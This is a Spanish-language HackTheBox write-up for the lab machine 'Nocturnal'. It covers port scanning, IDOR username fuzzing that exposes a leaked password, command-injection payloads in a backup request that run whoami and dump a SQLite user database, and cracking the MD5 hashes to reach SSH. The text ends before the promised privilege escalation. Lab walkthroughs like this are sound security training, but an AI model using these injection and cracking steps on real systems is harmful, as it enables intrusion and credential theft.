<!doctype html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Nocturnal - Easy (HTB)" /><meta property="og:locale" content="es" /><meta name="description" content="Writeup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818." /><meta property="og:description" content="Writeup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818." /><link rel="canonical" href="https://robertoluzanilla.github.io/posts/nocturnal-easy/" /><meta property="og:url" content="https://robertoluzanilla.github.io/posts/nocturnal-easy/" /><meta property="og:site_name" content="LogRob" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-08-23T19:00:00-06:00" /><meta property="og:image" content="https://robertoluzanilla.github.io/assets/img/fotogato.png" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://robertoluzanilla.github.io/assets/img/fotogato.png" /><meta property="twitter:title" content="Nocturnal - Easy (HTB)" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-08-24T20:48:10-06:00","datePublished":"2025-08-23T19:00:00-06:00","description":"Writeup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818.","headline":"Nocturnal - Easy (HTB)","mainEntityOfPage":{"@type":"WebPage","@id":"https://robertoluzanilla.github.io/posts/nocturnal-easy/"},"url":"https://robertoluzanilla.github.io/posts/nocturnal-easy/"}</script><title>Nocturnal - Easy (HTB) | LogRob</title><link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/fotogato.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/">LogRob</a><p class="site-subtitle fst-italic mb-0">Hacking, Ciberseguridad y Aprendizaje</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/RobertoLuzanilla" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['luzanillasanchez','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Nocturnal - Easy (HTB)</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Nocturnal - Easy (HTB)</h1><p class="post-desc fw-light mb-4">Writeup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1755997200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Aug 23, 2025 </time> </span> <span> Updated <time data-ts="1756090090" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Aug 25, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/RobertoLuzanilla">Roberto Carlos Luzanilla Sanchez</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2792 words" > <em>15 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Nocturnal - Easy (HTB)</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Nocturnal - Easy (HTB)</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h1 id="nocturnal--easy">Nocturnal ‚Äî EASY</h1><p>Este writeup detalla la explotaci√≥n de la m√°quina <strong>Nocturnal</strong> de Hack The Box, utilizando un fallo de <strong>IDOR</strong> para obtener credenciales, una <strong>RCE</strong> en el <em>script</em> de <em>backup</em> de la base de datos <strong>SQLite</strong>, y una escalada de privilegios a <strong>root</strong> mediante la explotaci√≥n del <strong>CVE-2023-46818</strong> en <strong>ISPConfig</strong>.</p><p>üìÖ Fecha: 20-04-2025 ¬† üîó IP: 10.10.11.64 ¬† üîç Estado: üéØ Resuelta</p><hr /><h2 id="reconocimiento"><span class="me-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Comenzamos con un escaneo exhaustivo de puertos para identificar la superficie de ataque.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:40
‚ï∞‚îÄ‚ùØ <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.64 ¬†-oN Scan_Inicial.txt
</pre></table></code></div></div><p>Lo que el escaneo dio:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.10.11.64
Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2025-08-23 17:41:25 EDT <span class="k">for </span>14s
Not shown: 62580 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 2953 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
<span class="c"># Nmap done at Sat Aug 23 17:41:39 2025 -- 1 IP address (1 host up) scanned in 14.47 seconds</span>
</pre></table></code></div></div><p>Ahora a escanear los puertos:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:42
‚ï∞‚îÄ‚ùØ nmap 10.10.11.64 <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-oN</span> Scan_Ports.txt
</pre></table></code></div></div><p>Lo obtenido:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.11.64
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 23 17:44:11 2025 -- 1 IP address (1 host up) scanned in 11.57 seconds
</pre></table></code></div></div><p>La informaci√≥n obtenida mostr√≥ que el servicio SSH estaba corriendo con OpenSSH 8.2p1 y que el servicio web usaba <strong>nginx 1.18.0</strong>, tambi√©n d√°ndonos el nombre del dominio: <code class="language-plaintext highlighter-rouge">http://nocturnal.htb/</code>.</p><p>Antes de adentrarnos a la p√°gina web a√±adimos el dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:47
‚ï∞‚îÄ‚ùØ <span class="nb">echo</span> <span class="s2">"10.10.11.64 nocturnal.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</pre></table></code></div></div><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823145354.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823145354.png" alt="hosts" loading="lazy"></a></p><p>Haciendo un <strong>whatweb</strong> esto es lo que arroja:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 17:55
‚ï∞‚îÄ‚ùØ whatweb http://nocturnal.htb/        
http://nocturnal.htb/ <span class="o">[</span>200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
</pre></table></code></div></div><p>Vemos que maneja PHP.</p><p>Al ver la p√°gina, observamos que pide <strong>iniciar sesi√≥n o registrarse</strong> para poder <strong>subir y ver archivos</strong>. Tambi√©n cuenta con una secci√≥n <strong>Contact Us</strong> con correo <code class="language-plaintext highlighter-rouge">support@nocturnal.htb</code>.</p><p>Creamos una cuenta y nos logeamos con <code class="language-plaintext highlighter-rouge">test:test</code>.</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823150058.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823150058.png" alt="signup" loading="lazy"></a></p><p>Como dec√≠a el inicio, podemos <strong>subir archivos</strong>.</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823150323.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823150323.png" alt="upload" loading="lazy"></a></p><p>he subido un archivo test.pdf, que no contiene mucho, sin embargo una vez subido el archivo hace referencia</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823151114.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823151114.png" alt="view-link" loading="lazy"></a></p><p>Y acepta como par√°metro el usuario, entonces, que pasa si hacemos un fuzzing a los usuarios? hasta encontrar uno que sea el correcto</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 18:14
‚ï∞‚îÄ‚ùØ ffuf <span class="nt">-u</span> <span class="s1">'http://nocturnal.htb/view.php?username=FUZZ&amp;file=*.pdf'</span> <span class="se">\</span>
<span class="nt">-w</span> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <span class="se">\</span>
<span class="nt">-mc</span> 200 <span class="nt">-fr</span> <span class="s2">"User not found."</span> <span class="se">\</span>
<span class="nt">-H</span> <span class="s2">"Cookie: PHPSESSID=[REDACTED]"</span>
</pre></table></code></div></div><p>Pese que aparecieron muchos usuarios, el mas interesante es amanda, puesto que amanda tiene un tama√±o diferente al de todos los demas, esto ya es una buena pista y buen comienzo</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>amanda                  <span class="o">[</span>Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms]
</pre></table></code></div></div><p>Ahora, probamos directamente:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://nocturnal.htb/view.php?username=amanda&amp;file=*.pdf
</pre></table></code></div></div><p>Vemos que <code class="language-plaintext highlighter-rouge">amanda</code> tiene un archivo:</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823151939.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823151939.png" alt="amanda-file" loading="lazy"></a></p><p>viendo un poco el archivo, puesto, veo que en el archivo content.xml viene lo siguiente</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;/text:p&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
<span class="nt">&lt;/text:p&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
<span class="nt">&lt;/text:p&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
<span class="nt">&lt;/text:p&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>Yours sincerely,<span class="nt">&lt;/text:p&gt;</span>
<span class="nt">&lt;text:p</span> <span class="na">text:style-name=</span><span class="s">"P1"</span><span class="nt">&gt;</span>Nocturnal's IT team<span class="nt">&lt;/text:p&gt;</span>
</pre></table></code></div></div><p>Con esa <strong>contrase√±a temporal</strong>, iniciamos sesi√≥n:</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823152439.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823152439.png" alt="amanda-login" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">amanda</code> tiene acceso a un <strong>panel de administraci√≥n</strong>:</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823152636.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823152636.png" alt="admin-panel" loading="lazy"></a></p><p>El panel permite <strong>crear un backup</strong>:</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823152628.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823152628.png" alt="backup-button" loading="lazy"></a></p><p>Viendo el c√≥digo de registro de usuarios:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SQLite3</span><span class="p">(</span><span class="s1">'../nocturnal_database/nocturnal_database.db'</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>

    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO users (username, password) VALUES (:username, :password)"</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bindValue</span><span class="p">(</span><span class="s1">':username'</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="no">SQLITE3_TEXT</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bindValue</span><span class="p">(</span><span class="s1">':password'</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="no">SQLITE3_TEXT</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">())</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'success'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'User registered successfully!'</span><span class="p">;</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: login.php'</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">'Failed to register user.'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p><strong>Interceptamos</strong> con Burp la petici√≥n del backup:</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/admin.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">nocturnal.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">45</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://nocturnal.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://nocturnal.htb/admin.php</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=[REDACTED]</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Priority</span><span class="p">:</span> <span class="s">u=0, i</span>

password=%0Abash%09-c%09"whoami"%0A&amp;backup=
</pre></table></code></div></div><p>vemos nada mas ni nada menos que una base de datos, entonces, intentemos interceptar la peticion que hace burp suite cuando queremos descargar el backup</p><p><a href="/assets/img/nocturnal-easy/Pasted%20image%2020250823154821.png" class="popup img-link shimmer"><img src="/assets/img/nocturnal-easy/Pasted%20image%2020250823154821.png" alt="whoami-www-data" loading="lazy"></a></p><p>Efectivamente si lo hay respondiendonos del usuario www-data</p><p>ahora veremos la base de datos</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">password</span><span class="o">=</span>%0Abash%09 c%09<span class="s2">"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump"</span>%0A &amp;backup<span class="o">=</span>
</pre></table></code></div></div><pre><code class="language-sqlite">INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb');
INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4');
INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d');
INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda');
INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db');
INSERT INTO users VALUES(8,'ciul','49858702f9317d7b6180b31c8a8120e4');
INSERT INTO users VALUES(9,'ataman','4de85829cc9cdd6983000733b8779c6f');
INSERT INTO users VALUES(10,'Smith','7076192633a1cc795f4db1c674b217b6');
</code></pre><p>todo lo meteremos a un archivo llamado hash.txt</p><p>y aplicaremos el siguiente comando</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>‚ï≠‚îÄkali@kali ~/Nocturnal/contenido at üïê 20:40
‚ï∞‚îÄ‚ùØ hashcat <span class="nt">-m</span> 0 hash.txt /usr/share/wordlists/rockyou.txt
</pre></table></code></div></div><p>El unico que nos dio fue el siguiente</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse
</pre></table></code></div></div><p>Parece ser del usuario tobias, haremos conexion por ssh, asi conseguimos la flag user.txt</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>tobias@nocturnal:~<span class="nv">$ </span><span class="nb">ls
</span>user.txt
